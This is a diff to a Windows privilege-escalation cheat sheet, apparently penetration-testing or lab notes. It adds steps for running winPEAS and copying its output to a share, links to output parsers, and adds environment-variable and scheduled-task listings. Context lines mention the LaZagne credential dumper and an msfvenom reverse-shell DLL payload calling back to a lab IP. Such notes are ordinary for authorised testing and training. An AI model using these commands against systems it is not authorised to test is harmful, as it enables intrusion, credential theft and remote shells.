@@ -29,6 +29,16 @@ Invoke-AllChecks
 /usr/share/peass/winpeas/winPEASx64.exe
 ```
 
+## winPEAS Run and Copy Output to Z:\downloads\winpeas
+```
+.\winPEASx64.exe log
+copy .\winpeas.out Z:\downloads\winpeas
+```
+Use parsers to convert to a better format for viewing outside of the original shell.
+Run with `.\winPEASx64.exe log`; these tools can't parse the ANSI color codes in the regular output.
+
+https://github.com/peass-ng/PEASS-ng/tree/master/parsers or better, https://github.com/mnemonic-re/parsePEASS
+
 # Manual Context Gathering
 
 ## Show current user privileges
@@ -117,6 +127,11 @@ wmic process get name,processid,commandline
 ## LaZagne (Source)
 ```
 https://github.com/AlessandroZ/LaZagne
+```
+
+## Get Environment Variables
+```
+Get-ChildItem -Path env:
 ```
 
 ## Search for files
@@ -243,8 +258,11 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll > e
 
 # Scheduled Tasks
 ## List scheduled tasks
-```powershell
+```cmd
 schtasks /query /fo LIST /v
+```
+
+```powershell
 Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,TaskPath
 ```
 
